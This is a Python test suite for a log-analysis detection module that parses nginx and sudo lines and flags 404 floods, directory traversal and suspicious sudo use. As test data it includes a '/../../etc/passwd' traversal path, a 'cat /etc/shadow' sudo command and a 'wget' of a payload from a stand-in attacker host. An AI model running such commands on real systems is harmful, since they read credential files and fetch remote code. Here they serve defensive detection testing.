"""Tests for core/detection_w2.py — nginx/sudo parsing, web attack + privesc detectors."""
from datetime import datetime, timedelta

from core.detection_w2 import (
    parse_nginx_line, parse_sudo_line,
    NotFoundFloodDetector, DirectoryTraversalDetector, PrivilegeEscalationDetector,
    WebLogEvent, TRUSTED_SUDO_USERS,
)


def make_web_event(event_type='404', source_ip='1.2.3.4', path='/missing',
                    timestamp=None, status_code=404):
    return WebLogEvent(
        raw_line='synthetic', timestamp=timestamp or datetime(2026, 1, 15, 9, 0, 0),
        source_ip=source_ip, method='GET', path=path,
        status_code=status_code, response_size=0, event_type=event_type,
    )


# ─── parse_nginx_line ───────────────────────────────────────────────────────

def test_parses_normal_request():
    event = parse_nginx_line('1.2.3.4 - - [15/Jan/2026:09:12:01 +0000] "GET /index.html HTTP/1.1" 200 1234')
    assert event.event_type == 'normal'
    assert event.source_ip == '1.2.3.4'
    assert event.status_code == 200


def test_parses_404_as_404_event():
    event = parse_nginx_line('1.2.3.4 - - [15/Jan/2026:09:12:01 +0000] "GET /wp-admin HTTP/1.1" 404 0')
    assert event.event_type == '404'


def test_parses_other_4xx_5xx_as_error():
    event = parse_nginx_line('1.2.3.4 - - [15/Jan/2026:09:12:01 +0000] "GET /x HTTP/1.1" 500 0')
    assert event.event_type == 'error'


def test_traversal_pattern_takes_priority_over_status():
    event = parse_nginx_line('1.2.3.4 - - [15/Jan/2026:09:12:01 +0000] "GET /../../etc/passwd HTTP/1.1" 200 0')
    assert event.event_type == 'traversal'


def test_malformed_nginx_line_returns_none():
    assert parse_nginx_line("not an nginx line") is None


# ─── parse_sudo_line ────────────────────────────────────────────────────────

def test_parses_sudo_command():
    line = "Jan 15 10:00:00 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow"
    event = parse_sudo_line(line)
    assert event['user'] == 'ibrahim'
    assert event['command'] == '/bin/cat /etc/shadow'


def test_line_without_sudo_marker_returns_none():
    assert parse_sudo_line("Jan 15 10:00:00 webserver sshd[1]: nothing to do with sudo") is None


# ─── NotFoundFloodDetector ──────────────────────────────────────────────────

def test_404_flood_fires_at_threshold():
    det = NotFoundFloodDetector(threshold=3, window_seconds=60)
    base = datetime(2026, 1, 15, 9, 0, 0)
    assert det.process_event(make_web_event(timestamp=base)) is None
    assert det.process_event(make_web_event(timestamp=base + timedelta(seconds=1))) is None
    alert = det.process_event(make_web_event(timestamp=base + timedelta(seconds=2)))
    assert alert is not None
    assert alert.rule == '404_flood'


def test_404_flood_ignores_non_404_events():
    det = NotFoundFloodDetector(threshold=1, window_seconds=60)
    assert det.process_event(make_web_event(event_type='normal', status_code=200)) is None


# ─── DirectoryTraversalDetector ─────────────────────────────────────────────

def test_traversal_fires_immediately():
    det = DirectoryTraversalDetector()
    alert = det.process_event(make_web_event(event_type='traversal', path='/../../etc/passwd'))
    assert alert is not None
    assert alert.severity == 'critical'


def test_traversal_dedups_identical_ip_and_path():
    det = DirectoryTraversalDetector()
    event = make_web_event(event_type='traversal', path='/../../etc/passwd')
    assert det.process_event(event) is not None
    assert det.process_event(event) is None


# ─── PrivilegeEscalationDetector ────────────────────────────────────────────

def test_trusted_user_benign_command_is_ignored():
    det = PrivilegeEscalationDetector()
    trusted_user = next(iter(TRUSTED_SUDO_USERS))
    event = {'user': trusted_user, 'command': 'ls -la', 'timestamp': datetime(2026, 1, 15, 9, 0, 0), 'raw_line': ''}
    assert det.process_event(event) is None


def test_untrusted_user_flagged_as_high_severity():
    det = PrivilegeEscalationDetector()
    event = {'user': 'mallory', 'command': 'ls -la', 'timestamp': datetime(2026, 1, 15, 9, 0, 0), 'raw_line': ''}
    alert = det.process_event(event)
    assert alert is not None
    assert alert.severity == 'high'
    assert 'unexpected user' in alert.description


def test_suspicious_command_from_trusted_user_flagged_as_critical():
    det = PrivilegeEscalationDetector()
    trusted_user = next(iter(TRUSTED_SUDO_USERS))
    event = {'user': trusted_user, 'command': 'wget http://evil.example/payload.sh', 'timestamp': datetime(2026, 1, 15, 9, 0, 0), 'raw_line': ''}
    alert = det.process_event(event)
    assert alert is not None
    assert alert.severity == 'critical'


def test_privesc_dedups_same_user_and_command():
    det = PrivilegeEscalationDetector()
    event = {'user': 'mallory', 'command': 'ls -la', 'timestamp': datetime(2026, 1, 15, 9, 0, 0), 'raw_line': ''}
    assert det.process_event(event) is not None
    assert det.process_event(event) is None
